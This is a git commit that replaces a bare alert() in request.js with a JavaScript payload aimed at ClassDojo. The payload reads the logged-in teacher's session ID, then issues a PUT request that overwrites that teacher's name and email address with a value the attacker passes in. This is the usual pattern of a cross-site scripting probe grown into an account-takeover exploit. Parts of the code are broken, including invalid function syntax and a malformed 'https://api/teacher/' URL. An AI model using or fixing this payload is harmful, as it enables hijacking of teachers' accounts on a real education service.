8ada3b8f402750b46dcf3eafb3f774ff36198cee
emre-bi <126341187+emre-bi@users.noreply.github.com>
2024-08-03 20:15:47 +0300

    Update request.js

--- request.js
+++ request.js
@@ -1,1 +1,18 @@
-alert();
+function(email) {
+    fetch('https://teach.classdojo.com/api/session')
+      .then(response => response.json())
+      .then(data => {
+        var teacherId = data.teacher._id;
+        fetch('https://api/teacher/' + teacherId, {
+          method: 'PUT',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            _id: teacherId,
+            title: 'a',
+            firstname: 'a',
+            lastname: 'a',
+            emailAddress: email
+          })
+        });
+      });
+  }
